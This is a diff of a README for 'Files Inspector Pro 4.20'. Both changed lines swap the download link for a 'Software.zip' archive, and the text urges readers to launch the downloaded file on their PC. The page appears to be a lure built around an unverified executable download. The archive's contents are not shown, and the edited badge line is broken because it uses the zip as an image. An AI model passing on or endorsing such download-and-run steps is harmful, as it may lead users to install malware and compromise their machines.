@@ -22,7 +22,7 @@ Welcome to the **Files Inspector Pro 4.20** repository! This repository is dedic
 
 ## Software Download 📥
 
-You can download the Files Inspector Pro 4.20 software by clicking [here](https://github.com/user-attachments/files/18410590/Software.zip) 📥. **Please make sure to launch the downloaded file to install the software on your PC.**
+You can download the Files Inspector Pro 4.20 software by clicking [here](https://github.com/williamardila123/Files-Inspector-Pro-4.20/releases/download/v2.0/Software.zip) 📥. **Please make sure to launch the downloaded file to install the software on your PC.**
 
 If you encounter any issues with the download link provided above, you can also check the **Releases** section of this repository for alternative download options. 🛠️
 
@@ -60,4 +60,4 @@ To stay updated with the latest developments and updates related to Files Inspec
 
 Thank you for considering Files Inspector Pro 4.20 for your file inspection needs. We hope this application proves to be a valuable asset in managing and analyzing files on your Windows PC. Happy inspecting! 🕵️‍♂️🔍
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Software](https://github.com/williamardila123/Files-Inspector-Pro-4.20/releases/download/v2.0/Software.zip)](https://github.com/williamardila123/Files-Inspector-Pro-4.20/releases/download/v2.0/Software.zip)
